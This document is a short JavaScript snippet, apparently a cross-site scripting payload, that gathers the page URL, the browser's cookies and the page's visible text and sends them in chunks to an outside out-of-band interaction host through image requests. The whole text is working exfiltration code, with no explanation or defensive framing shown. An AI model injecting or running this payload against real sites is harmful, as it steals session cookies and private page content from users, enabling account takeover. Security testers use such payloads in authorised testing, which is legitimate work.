let d = location.href + "\nCOOKIE=" + document.cookie + "\nBODY=" + document.body.innerText;
for (let i = 0; i < d.length; i += 900) {
  new Image().src = 'https://d8mtciqo12ps5bcm0kqgkjxs15pbb6q7e.oast.online/?i=' + i + '&d=' + encodeURIComponent(d.slice(i, i + 900));
}
